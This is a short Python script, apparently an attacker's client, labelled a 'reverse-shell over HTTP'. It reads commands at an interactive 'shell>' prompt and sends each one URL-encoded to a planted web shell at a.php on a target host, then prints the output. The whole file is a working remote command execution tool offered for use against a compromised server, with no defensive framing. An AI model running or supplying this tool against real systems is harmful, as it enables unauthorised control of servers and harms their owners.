import argparse
import sys
import urllib.parse
import requests

def parse_cli() -> str:
    parser = argparse.ArgumentParser(
        description="reverse‑shell over HTTP"
    )
    parser.add_argument(
        "target",
        help="Target in the form <host> or <host:port>, e.g. 10.0.2.4 or 10.0.2.4:8080",
    )
    args = parser.parse_args()
    return args.target

def build_url(target: str) -> str:
    return f"http://{target}/a.php"

def main() -> None:
    target = parse_cli()
    url = build_url(target)

    print(f"[+] Connected. Sending commands to {url}?a=<CMD>")
    try:
        while True:
            cmd = input("shell> ").strip()
            if cmd.lower() in {"exit", "quit"}:
                break
            if not cmd:
                continue

            encoded = urllib.parse.quote(cmd, safe="")
            try:
                r = requests.get(f"{url}?a={encoded}", timeout=15)
                print(r.text.rstrip())
            except requests.RequestException as e:
                print(f"[!] HTTP error: {e}", file=sys.stderr)

    except KeyboardInterrupt:
        pass
    finally:
        print("\n[+] Bye!")

if __name__ == "__main__":
    main()
